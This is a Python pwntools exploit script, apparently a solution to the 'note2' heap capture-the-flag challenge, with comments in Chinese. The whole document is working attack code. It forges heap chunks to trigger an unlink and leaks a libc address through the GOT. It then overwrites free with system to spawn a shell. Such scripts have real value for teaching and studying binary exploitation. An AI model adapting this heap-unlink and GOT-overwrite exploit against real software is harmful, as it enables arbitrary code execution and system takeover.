# export GLIBC_TUNABLES=glibc.malloc.tcache_count=0
from pwn import*
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '80'])
p = process('./note2')
elf = ELF('./note2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create(size, content):
    p.recvuntil('option--->>\n')
    p.sendline('1')
    p.recvuntil('Input the length of the note content:(less than 128)\n')
    p.sendline(str(size))
    p.recvuntil('Input the note content:\n')
    p.sendline(content)
def show(index):
    p.recvuntil('option--->>\n')
    p.sendline('2')
    p.recvuntil('Input the id of the note:\n')
    p.sendline(str(index))
def edit(index, choose, content):
    p.recvuntil('option--->>\n')
    p.sendline('3')
    p.recvuntil('Input the id of the note:\n')
    p.sendline(str(index))
    p.recvuntil('do you want to overwrite or append?[1.overwrite/2.append]\n')
    p.sendline(str(choose))
    p.recvuntil('TheNewContents:')
    p.sendline(content)
    p.recvuntil('Edit note success!\n')
def delete(index):
    p.recvuntil('option--->>\n')
    p.sendline('4')
    p.recvuntil('Input the id of the note:\n')
    p.sendline(str(index))

# start
p.recvuntil('Input your name:\n')
p.sendline('name')
p.recvuntil('Input your address:\n')
p.sendline('address')

# unlink需要的数据
content = 0x602120
mem2 = content + 8
FD = mem2 - 0x18
BK = mem2 - 0x10

# 第1个chunk为第4个chunk占位
# 第2, 3个chunk用来触发unlink
# 第4个chunk用来修改第2, 3个chunk的数据
create(0, b'aaaa')      # 0x20
create(0x80, b'bbbb')   # 0x90
create(0x80, b'cccc')   # 0x90
delete(0)
payload = b'/bin/sh\x00' * 2
payload += p64(0) + p64(0x91)
payload += p64(0) + p64(0x81)
payload += p64(FD) + p64(BK)
payload = payload.ljust(0x90 + 0x10, b'\x00')
payload += p64(0x80) + p64(0x90)
create(0, payload)
delete(2)

# 泄露glibc基地址
edit(1, 1, b'a'*0x18 + p64(elf.got['free']))
show(1)
p.recvuntil('Content is ')
free_addr = u64(p.recv(6).ljust(0x8, b'\x00'))
libc_base = free_addr - libc.sym['free']
system_addr = libc_base + libc.sym['system']
print('libc_base的地址' + hex(libc_base))
print('free_addr的地址' + hex(free_addr))
print('system_addr的地址' + hex(system_addr))

# 触发漏洞
edit(1, 1, p64(system_addr))
delete(3)

#gdb.attach(p)
p.interactive()
